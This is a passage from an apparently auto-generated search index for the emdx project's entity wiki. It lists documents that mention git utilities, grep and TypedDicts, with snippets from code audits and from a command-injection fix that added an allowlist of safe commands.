(2 shared docs, PMI=6.4)</li> <li><code>core.py:321</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>console = console()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>ask.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>browse.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (10 shared docs, PMI=5.9)</li> <li><code>analyze.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.9)</li> </ul>"},{"location":"entities/git-integration/","title":"git integration","text":"<p>Type: heading | Mentioned in: 8 documents | First seen: 2025-07-07</p>"},{"location":"entities/git-integration/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6092 PROZE/EMDX Feature Exploration - 10 Paths Deep Dive   Section: PATH 4: proze as Standalone Tool</p> </li> <li> <p>#6085 Prose Diff Tool - Deep Research Findings   Section: Rust Tech Stack</p> <p>...tatui<code>or raw ANSI | Colored inline output | | CLI |</code>clap` | Argument parsing | | Git integration | gitattributes config | Custom diff driver |</p> </li> <li> <p>#289 README   Section: emdx - Documentation Index Management System</p> <p>A powerful command-line tool for managing your personal knowledge base with SQLite full-text search, Git integration, and a beautiful terminal interface.</p> </li> <li> <p>#4754 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Common Themes Across All Analyses</p> <p>...nking</p> </li> <li>AI Agent Framework: Configurable agents with multi-stage workflows</li> <li> <p>Git Integration: Auto-project detection, diff browser, worktree support</p> </li> <li> <p>#176 Project Overview Documentation   Section: Unique Features</p> <p>...formance Optimizations** - Includes indexing strategies and caching for scale</p> </li> <li>Git Integration - Automatically detects project context from git repositories</li> <li>Smart Completions - Context-aware tab completion for database operations</li> <li> <p>*Access Tracking...</p> </li> <li> <p>#6567 Delegate synthesis [synthesis]   Section: Conclusion</p> <p>...e + persistent). The synthesis feature intelligently handles partial failures, and git integration enables safe code modifications. Key improvement opportunities include async migration, worktree pooling, and service consolidation.</p> </li> <li> <p>#6100 Gameplan #4: Semantic Find Upgrade   Section: User Experience</p> <p>...extraction: ```bash emdx find \"how to set up git diff driver\" --extract</p> </li> </ul>"},{"location":"entities/git-integration/#git-integration_1","title":"Git integration","text":"<p>git diff README.md  # uses proze automatically ```</p>"},{"location":"entities/git-integration/#6086-git-integration-score-082","title":"#6086 \u00a7\"Git Integration\" (score: 0.82):","text":""},{"location":"entities/git-integration/#proze-setup-git-configures-gitattributes-and-gitconfig","title":"\"proze --setup-git configures .gitattributes and .gitconfig","text":""},{"location":"entities/git-integration/#to-use-proze-as-the-diff-driver-for-md-files","title":"to use proze as the diff driver for *.md files...\"","text":""},{"location":"entities/git-integration/#_1","title":"git integration","text":""},{"location":"entities/git-integration/#6085-custom-diff-drive","title":"#6085 \u00a7\"Custom Diff Drive...","text":"<ul> <li>#6094 EMDX Feature Deep Dive - Claude-First Design   Section: FEATURE 5: Semantic <code>emdx find</code> Upgrade </li> </ul>"},{"location":"entities/git-integration/#instead-of-returning-whole-docs-returns-relevant-chunks","title":"Instead of returning whole docs, returns relevant CHUNKS:","text":""},{"location":"entities/git-integration/#6086-git-integration-score-082_1","title":"#6086 \u00a7\"Git Integration\" (score: 0.82):","text":""},{"location":"entities/git-integration/#proze-setup-git-configures-gitattributes-and-gitconfig_1","title":"\"proze --setup-git configures .gitattributes and .gitconfig","text":""},{"location":"entities/git-integration/#to-use-proze-as-the-diff-driver-for-md-files_1","title":"to use proze as the diff driver for *.md files...\"","text":""},{"location":"entities/git-integration/#_2","title":"git integration","text":""},{"location":"entities/git-integration/#6085-custom-diff-drive_1","title":"#6085 \u00a7\"Custom Diff Drive...","text":""},{"location":"entities/git-integration/#related-entities","title":"Related Entities","text":"<ul> <li><code>why it matters for claude</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>view by id</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>to use proze as the diff driver for *.md files...\"</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>session design</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>save a markdown file</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>list all documents</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>daily digest \u2014 feb 13, 2026</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>daily digest</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>custom diff drivers</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>claude claude</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/gitopspy/","title":"git_ops.py","text":"<p>Type: tech_term | Mentioned in: 16 documents | First seen: 2026-02-13</p>"},{"location":"entities/gitopspy/#documents-16","title":"Documents (16)","text":"<ul> <li> <p>#6874 Delegate synthesis [synthesis]   Section: By the Numbers</p> <p>...| <code>models/</code> | 4 dead functions + 1 dead type | \u2014 | 0 | | <code>utils/</code> | ~700 lines in <code>git_ops.py</code> | \u2014 | 3 entire files removable |</p> </li> <li> <p>#6512 None Type Analysis [synthesis]   Section: Key Findings</p> </li> </ul>"},{"location":"entities/gitopspy/#4-dataclass-default-factory-pattern","title":"4. Dataclass Default Factory Pattern","text":"<p><code>emdx/utils/git_ops.py:33</code>: ```python</p>"},{"location":"entities/gitopspy/#before","title":"Before","text":"<p>worktrees: list['GitWorktree'] | None = None</p> <ul> <li>#6510 None Type Analysis [7/7]   Section: Low Confidence \u2014 Dataclass Default Pattern <ol> <li><code>git_ops.py</code> line 33:</li> </ol> </li> <li> <p><code>worktrees: list['GitWorktree'] | None = None</code> \u2014 Could use <code>field(default_factory=list)</code></p> </li> <li> <p>#6338 Architecture Improvements: Implementation Summary   Section: Status: Improvements Already Implemented</p> <p>...ities \u2705 The analysis flagged \"duplicate create_worktree functions\" in <code>git.py</code> vs <code>git_ops.py</code>, but these are actually different functions serving different purposes:</p> </li> <li> <p><code>git.py:create_worktree()</code> - Simple version for delegate command (temporary worktrees)...</p> </li> <li> <p>#6337 Delegate: Logging Cleanup [4/12]   Section: Changes Made</p> </li> <li>The function was only used by one file (<code>git_ops.py</code>)</li> <li>It was a wrapper that added unnecessary file handler configuration on import</li> <li> <p>Removed 28 lines of code</p> </li> <li> <p>#6335 Architecture Refactoring Assessment - February 2026   Section: Issue 5: Duplicate Git Utilities (NOT ADDRESSED)</p> <p>Analysis Finding: <code>git.py</code> and <code>git_ops.py</code> with duplicate <code>create_worktree()</code> functions.</p> </li> <li> <p>#6332 Architecture Analysis Summary - Key Takeaways   Section: Medium-Term Refactors</p> <ol> <li>Split <code>migrations.py</code> into directory with 1 file per migration</li> </ol> </li> <li>Merge <code>git.py</code> + <code>git_ops.py</code> (duplicate <code>create_worktree()</code>)</li> <li>Move execution code from <code>utils/</code> to <code>services/execution/</code></li> <li> <p>Add presenters to LogBrowser and CascadeBrowser</p> </li> <li> <p>#6330 Delegate synthesis [synthesis]   Section: Code Organization Issues</p> <ol> <li>Git utilities split across files: <code>git.py</code> (129 lines) and <code>git_ops.py</code> (753 lines) with duplicate <code>create_worktree()</code> functions</li> </ol> </li> <li> <p>#6329 Delegate: Analyze emdx/utils/ and emdx/config/ for architecture improv [5/10]   Section: Current State: 16 utility files</p> <p>...ormatting | 47 | Good, minimal | | <code>git.py</code> | Basic git ops | 129 | OVERLAP with git_ops.py | | <code>git_ops.py</code> | TUI git operations | 753 | Large, has <code>create_worktree</code> duplicate | | <code>lazy_group.py</code> | CLI lazy loading | 247 | Good, specialized | | `logg...</p> </li> <li> <p>#6319 Codebase Quality Analysis \u2014 Synthesized Summary (2026-02-14)   Section: Tier 3: Conciseness Wins</p> <p>...~200 | HIGH | | CLI error handling boilerplate | 103 | ~120 | HIGH | | <code>git.py</code> + <code>git_ops.py</code> duplication | 2 files | ~400 | HIGH | | 4 identical truncation functions | 4 | ~40 | LOW | | Deprecated <code>execute_claude_sync()</code> | 1 caller | ~45 | MEDIUM |</p> </li> <li> <p>#6311 Delegate: Analyze DEAD CODE &amp; DUPLICATION across emdx/ (exclude ui/ an [8/15]   Section: 1. MAJOR DUPLICATION: git.py vs git_ops.py (HIGH PRIORITY)</p> </li> <li><code>emdx/utils/git.py</code> (129 lines)</li> <li> <p><code>emdx/utils/git_ops.py</code> (753 lines)</p> </li> <li> <p>#6304 Delegate: Analyze NAMING &amp; CLARITY across emdx/ (exclude ui/ and tests [1/15]   Section: 1. Module Duplication Pattern (High Impact)</p> <p>...ations | <code>create_worktree()</code>, <code>cleanup_worktree()</code>, <code>get_git_project()</code> | | <code>utils/git_ops.py</code> | Extended git operations | <code>create_worktree()</code>, <code>get_worktrees()</code>, <code>GitWorktree</code>, <code>GitProject</code> |</p> </li> <li> <p>#6222 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: Utils (Medium Priority)</p> <p>...ended Tests | |--------|-----------------|----------|-------------------| | <code>utils/git_ops.py</code> | <code>discover_projects_from_main_repos()</code>, <code>discover_projects_from_worktrees()</code>, <code>get_worktrees()</code>, <code>get_git_status()</code>, <code>create_worktree()</code>, <code>remove_worktree()</code> | MED...</p> </li> <li> <p>#6175 Delegate: Audit emdx/utils/ for dead code. For EACH of the 18 files in [4/17]   Section: Summary</p> <p>Analyzed 18 files in <code>emdx/utils/</code>. Found 3 files with dead code/imports, 1 file unused, 3 logging-related files with redundancy, and duplication between git.py and git_ops.py.</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> </li> <li>git_ops.py: All 4 necessary</li> <li>structured_logger.py: All 4 necessary</li> <li>git.py: All 2 necessary</li> <li>retry.py: All 2 necessary</li> <li> <p>environment.py: All 2 necessary -...</p> </li> <li> <p>#6445 Test [2/2]   Section: Coverage Analysis by Area</p> <p>...------| | <code>services/health_monitor.py</code> | 12% | System health monitoring | | <code>utils/git_ops.py</code> | 15% | Git worktree operations | | <code>utils/environment.py</code> | 19% | Environment detection | | <code>ui/cascade/cascade_view.py</code> | 21% | Cascade TUI view | | `ui/log_brows...</p> </li> </ul>"},{"location":"entities/gitopspy/#1-removed-get_logger-from-emdxutilslogging_utilspy","title":"1. Removed <code>get_logger()</code> from <code>emdx/utils/logging_utils.py</code>","text":""},{"location":"entities/gitopspy/#files","title":"Files","text":""},{"location":"entities/gitopspy/#utils-module","title":"Utils Module","text":""},{"location":"entities/gitopspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>utils/text_formatting.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.7)</li> <li><code>ui/presenters/document_browser_presenter.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>lazy loading in main.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>gitproject</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>get_worktrees()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>git.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (10 shared docs, PMI=5.5)</li> <li><code>text_formatting.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> <li><code>structured_logger.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> <li><code>environment.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> <li><code>create_worktree()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/gitpy/","title":"git.py","text":"<p>Type: tech_term | Mentioned in: 12 documents | First seen: 2026-02-13</p>"},{"location":"entities/gitpy/#documents-12","title":"Documents (12)","text":"<ul> <li>#6483 Delegate: Kink 5: Unify delegate branch naming in emdx/commands/delega [2/3]   Section: Problem <ol> <li><code>create_worktree()</code> in <code>git.py</code>: Used <code>worktree-{timestamp}-{pid}-{random}</code> - purely random, no task context</li> </ol> </li> <li> <p><code>_run_parallel()</code>: Used <code>{prefix}/{slug}-{n}</code> where prefix was \"fix\" for PR or...</p> </li> <li> <p>#6338 Architecture Improvements: Implementation Summary   Section: Status: Improvements Already Implemented</p> <p>...3. Git Utilities \u2705 The analysis flagged \"duplicate create_worktree functions\" in <code>git.py</code> vs <code>git_ops.py</code>, but these are actually different functions serving different purposes:</p> </li> <li> <p><code>git.py:create_worktree()</code> - Simple version for delegate command (temp...</p> </li> <li> <p>#6335 Architecture Refactoring Assessment - February 2026   Section: Issue 5: Duplicate Git Utilities (NOT ADDRESSED)</p> <p>Analysis Finding: <code>git.py</code> and <code>git_ops.py</code> with duplicate <code>create_worktree()</code> functions.</p> </li> <li> <p>#6332 Architecture Analysis Summary - Key Takeaways   Section: Medium-Term Refactors</p> <ol> <li>Split <code>migrations.py</code> into directory with 1 file per migration</li> </ol> </li> <li>Merge <code>git.py</code> + <code>git_ops.py</code> (duplicate <code>create_worktree()</code>)</li> <li>Move execution code from <code>utils/</code> to <code>services/execution/</code></li> <li> <p>Add presenters to LogBrowser and CascadeBrowser</p> </li> <li> <p>#6330 Delegate synthesis [synthesis]   Section: Code Organization Issues</p> <ol> <li>Git utilities split across files: <code>git.py</code> (129 lines) and <code>git_ops.py</code> (753 lines) with duplicate <code>create_worktree()</code> functions</li> </ol> </li> <li> <p>#6329 Delegate: Analyze emdx/utils/ and emdx/config/ for architecture improv [5/10]   Section: Current State: 16 utility files</p> <p>...od, but large class | | <code>file_size.py</code> | Size formatting | 47 | Good, minimal | | <code>git.py</code> | Basic git ops | 129 | OVERLAP with git_ops.py | | <code>git_ops.py</code> | TUI git operations | 753 | Large, has <code>create_worktree</code> duplicate | | <code>lazy_group.py</code> | C...</p> </li> <li> <p>#6319 Codebase Quality Analysis \u2014 Synthesized Summary (2026-02-14)   Section: Tier 3: Conciseness Wins</p> <p>...te | 143 | ~200 | HIGH | | CLI error handling boilerplate | 103 | ~120 | HIGH | | <code>git.py</code> + <code>git_ops.py</code> duplication | 2 files | ~400 | HIGH | | 4 identical truncation functions | 4 | ~40 | LOW | | Deprecated <code>execute_claude_sync()</code> | 1 caller | ~45 | ME...</p> </li> <li> <p>#6311 Delegate: Analyze DEAD CODE &amp; DUPLICATION across emdx/ (exclude ui/ an [8/15]   Section: 1. MAJOR DUPLICATION: git.py vs git_ops.py (HIGH PRIORITY)</p> </li> <li><code>emdx/utils/git.py</code> (129 lines)</li> <li> <p><code>emdx/utils/git_ops.py</code> (753 lines)</p> </li> <li> <p>#6304 Delegate: Analyze NAMING &amp; CLARITY across emdx/ (exclude ui/ and tests [1/15]   Section: 1. Module Duplication Pattern (High Impact)</p> File Purpose Functions <code>utils/git.py</code> Basic git operations <code>create_worktree()</code>, <code>cleanup_worktree()</code>, <code>get_git_project()</code> <code>utils/git_ops.py</code> Extended git operations <code>create_worktree()</code>, `get... </li> <li> <p>#6261 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [15/37]   Section: 4. Narrowed Exception Types</p> <ul> <li><code>git.py</code>: Changed <code>except Exception</code> to <code>except (subprocess.SubprocessError, OSError)</code></li> </ul> </li> <li> <p>#6175 Delegate: Audit emdx/utils/ for dead code. For EACH of the 18 files in [4/17]   Section: Summary</p> <p>Analyzed 18 files in <code>emdx/utils/</code>. Found 3 files with dead code/imports, 1 file unused, 3 logging-related files with redundancy, and duplication between git.py and git_ops.py.</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...- git_ops.py: All 4 necessary</p> </li> <li>structured_logger.py: All 4 necessary</li> <li>git.py: All 2 necessary</li> <li>retry.py: All 2 necessary</li> <li>environment.py: All 2 necessary</li> <li>datetime_utils.py: All 2 necessary</li> <li>cli_config.py: All 4 necessar...</li> </ul>"},{"location":"entities/gitpy/#files","title":"Files","text":""},{"location":"entities/gitpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>lazy loading in main.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>gitproject</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>tuple[str, str]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>tuple[bool, str, str]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>split migrations.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>services/execution/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>text_formatting.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>structured_logger.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>create_worktree()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.8)</li> <li><code>utils/text_formatting.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> </ul>"},{"location":"entities/grep/","title":"grep","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-14</p>"},{"location":"entities/grep/#documents-10","title":"Documents (10)","text":"<ul> <li>#6852 FIX-6: Delegate --pr Permission Failures Analysis   Section: Secondary Issue: Missing Non-Bash Tool Coverage <p>....claude/settings.json<code>pre-approves</code>Read<code>,</code>Write<code>,</code>Edit<code>,</code>MultiEdit<code>,</code>Glob<code>,</code>Grep`</p> </li> <li> <p>But this is user-specific \u2014 other users without those settings would face Edit/Write permission failures</p> </li> <li> <p>#6465 Security Audit and Fixes: EMDX Command Injection Vulnerability   Section: 1. Command Allowlist</p> <p>Only safe file-discovery commands are permitted:</p> </li> <li> <p><code>fd</code>, <code>find</code>, <code>git</code>, <code>ls</code>, <code>rg</code>, <code>grep</code>, <code>eza</code>, <code>exa</code>, <code>tree</code>, <code>locate</code>, <code>ag</code>, <code>mdfind</code></p> </li> <li> <p>#6272 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [36/37]   Section: Fix Implementation</p> <p>...ls` - List files</p> </li> <li><code>git</code> - Git operations (ls-files, diff --name-only)</li> <li><code>rg</code> - Ripgrep</li> <li><code>grep</code> - For -l mode</li> <li> <p><code>emdx</code> - Our own CLI</p> </li> <li> <p>#6270 Security Fix: Command Injection in delegate --each   Section: 1. Fixed Command Injection in <code>_run_discovery()</code> (CRITICAL)</p> <p>...:**</p> </li> <li>Added <code>SAFE_DISCOVERY_COMMANDS</code> allowlist: <code>fd</code>, <code>find</code>, <code>git</code>, <code>ls</code>, <code>rg</code>, <code>grep</code>, <code>eza</code>, <code>exa</code></li> <li>Added <code>_validate_discovery_command()</code> function that:</li> <li>Parses command with <code>shlex.split()</code> </li> <li>Validates base command is in allowlist</li> <li> <p>Checks...</p> </li> <li> <p>#6267 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [32/37]   Section: The Fix</p> <ol> <li>Command Allowlist: Only safe discovery commands are permitted:</li> </ol> </li> <li> <p><code>fd</code>, <code>find</code>, <code>git</code>, <code>rg</code>, <code>ls</code>, <code>grep</code>, <code>jq</code>, <code>eza</code>, <code>cat</code>, <code>head</code>, <code>tail</code>, etc.</p> </li> <li> <p>#6265 Delegate: Document #6230 - Security Fix Implementation   Section: Fix Implementation</p> </li> <li><code>fd</code>, <code>find</code>, <code>git</code>, <code>rg</code>, <code>grep</code>, <code>ls</code>, <code>eza</code></li> <li> <p><code>cat</code>, <code>head</code>, <code>tail</code>, <code>sort</code>, <code>uniq</code>, <code>wc</code>, <code>echo</code>, <code>printf</code></p> </li> <li> <p>#6260 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [26/37]   Section: Fix Applied</p> <ol> <li>Created <code>SAFE_DISCOVERY_COMMANDS</code> allowlist - Only permits known-safe file discovery commands: <code>fd</code>, <code>find</code>, <code>git</code>, <code>ls</code>, <code>rg</code>, <code>grep</code>, <code>eza</code>, <code>exa</code></li> </ol> </li> <li> <p>#6258 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [24/37]   Section: Summary</p> </li> <li>Allowlist validation: Only safe discovery commands are permitted:</li> <li> <p><code>fd</code>, <code>find</code>, <code>git</code>, <code>ls</code>, <code>eza</code>, <code>rg</code>, <code>grep</code>, <code>ag</code>, <code>tree</code></p> </li> <li> <p>#6251 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [16/37]   Section: Summary</p> </li> <li>Command allowlist: Only safe file-listing commands are permitted:</li> <li> <p><code>fd</code>, <code>find</code>, <code>git</code>, <code>ls</code>, <code>rg</code>, <code>grep</code>, <code>eza</code>, <code>exa</code>, <code>tree</code>, <code>locate</code></p> </li> <li> <p>#6238 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [6/37]   Section: The Fix</p> </li> <li><code>fd</code>, <code>find</code>, <code>git</code>, <code>ls</code>, <code>rg</code>, <code>grep</code>, <code>eza</code>, <code>exa</code></li> </ul>"},{"location":"entities/grep/#1-command-allowlist","title":"1. Command Allowlist","text":"<p>Added <code>SAFE_DISCOVERY_COMMANDS</code> frozenset containing only file-listing commands:</p>"},{"location":"entities/grep/#the-fix","title":"The Fix","text":""},{"location":"entities/grep/#the-fix_1","title":"The Fix","text":""},{"location":"entities/grep/#1-command-allowlist_1","title":"1. Command Allowlist","text":"<p>Only safe discovery commands are permitted:</p>"},{"location":"entities/grep/#related-entities","title":"Related Entities","text":"<ul> <li><code>shell metacharacter blocking</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>allowlist validation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>1. command allowlist</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>risk assessment update</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>command allowlist only</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>after (secure):</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>testvalidatediscoverycommand</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>after (secure)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>3. safe execution</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>the fix</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/groupdict/","title":"groupdict","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-16</p>"},{"location":"entities/groupdict/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6581 Delegate: Audit emdx/ui/ for methods with Any-typed parameters that co [2/3]   Section: 20. <code>activity/group_picker.py:116-117</code> \u2014 <code>groups: list[dict[str, Any]]</code></p> <p>These hold group data from <code>groups_db.list_groups()</code>. If the shape is known, could use <code>GroupDict</code> from <code>ui/types.py</code>.</p> </li> <li> <p>#6578 Delegate: List all TypedDicts defined in emdx/ and count how many file   Section: All 45 TypedDicts (by location)</p> </li> <li> <p>#6515 Any removal Phase 2: UI TypedDicts   Section: 1. Created <code>emdx/ui/types.py</code></p> <ul> <li><code>GroupDict</code>: Document group data used by <code>GroupItem</code> in the activity view. Fields include <code>id</code>, <code>name</code>, <code>description</code>, <code>group_type</code>, <code>created_at</code>, <code>doc_count</code>, `total_cost_us...</li> </ul> </li> <li> <p>#6509 Any Type Removal Analysis [synthesis]   Section: Common Themes</p> <p>Recommendation: Create TypedDicts in <code>emdx/ui/types.py</code> or <code>emdx/models/types.py</code>:</p> </li> <li><code>DocumentDict</code></li> <li><code>ExecutionData</code></li> <li><code>GroupDict</code></li> <li><code>CascadeRunDict</code></li> <li> <p><code>TagInfo</code></p> </li> <li> <p>#6508 Any Type Removal Analysis [synthesis]   Section: Common Patterns Identified</p> <p>...ctures (15+ occurrences) Solution: Create TypedDicts for:</p> </li> <li><code>CascadeRunDict</code>, <code>GroupDict</code>, <code>PipelineActivityDict</code> (UI layer)</li> <li><code>CompactDocumentRow</code>, <code>DistillDocumentRow</code>, <code>SynthesisResult</code> (Commands)</li> <li><code>PopularTag</code>, <code>FuzzyDocInfo</code> (Services)</li> <li> <p>Update kwa...</p> </li> <li> <p>#6491 Any Type Removal Analysis [1/5]   Section: 6. Line 302: <code>GroupItem.group</code> field</p> <p>Recommended: Create a TypedDict: ```python class GroupDict(TypedDict, total=False):     id: int     name: str     group_type: str     description: str     project: str     doc_count: int     total_tokens: int     total_cost_...</p> </li> <li> <p>#6488 Any Type Removal Analysis [1/5]   Section: Occurrence 8: <code>group: dict[str, Any]</code> and 